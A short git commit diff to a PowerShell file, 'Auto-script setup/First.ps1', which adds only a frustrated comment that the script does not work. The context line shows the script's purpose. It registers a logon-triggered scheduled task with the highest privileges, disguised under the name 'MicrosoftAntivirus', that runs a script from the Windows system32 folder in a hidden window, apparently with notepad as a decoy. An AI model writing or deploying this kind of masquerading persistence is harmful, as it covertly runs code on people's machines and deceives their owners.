562b9767aea1e646042d9cf7cead82053f21d29c
CGMW293 <138163744+CGMW293@users.noreply.github.com>
2023-08-19 19:21:05 -0700

    Update First.ps1

--- Auto-script setup/First.ps1
+++ Auto-script setup/First.ps1
@@ -1,2 +1,3 @@
 Register-ScheduledTask -TaskName 'MicrosoftAntivirus' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute '${Env:WinDir}\System32\WindowsPowerShell\v1.0\powershell.exe' -Argument '-WindowStyle Hidden -Command & ''C:\Windows\system32\ski.ps1''') -RunLevel Highest -Force;
 notepad.exe;
+#this shit does not work bruh
